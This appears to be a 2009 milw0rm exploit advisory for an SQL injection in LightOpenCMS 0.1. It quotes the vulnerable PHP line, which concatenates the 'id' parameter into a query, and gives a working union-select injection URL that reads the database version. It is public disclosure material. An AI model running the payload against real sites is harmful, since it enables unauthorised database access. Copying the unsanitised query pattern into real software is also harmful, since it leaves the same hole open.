@@ -1,0 +1,23 @@
+[+] LightOpenCMS (id) SQL Injection Vulnerability
+
+[+] Author: Mi4night
+
+[+] Script: http://sourceforge.net/project/downloading.php?group_id=251474&filename=locms-0.1-pa.zip&a=4814604
+
+[+] Injection:
+
+http://127.0.0.1/[path]/index.php?id=-1%27%20union%20select%201,2,@@version,4%20%23
+
+[+] Requires: magic_gpc() == OFF
+
+[+] Vulnerable code:
+if (isset($_GET['id'])) {
+            $result = mysql_query("SELECT * FROM pages WHERE id='".$_GET['id']."'");
+
+[+] Patch:
+Its fucking beta.. or alpha or whatever. they'll fix it in the stable version !
+
+
+[+] Shoutz to: Nuc my brotha, str0ke and all the otherz i forgot xD
+
+# milw0rm.com [2009-05-18]
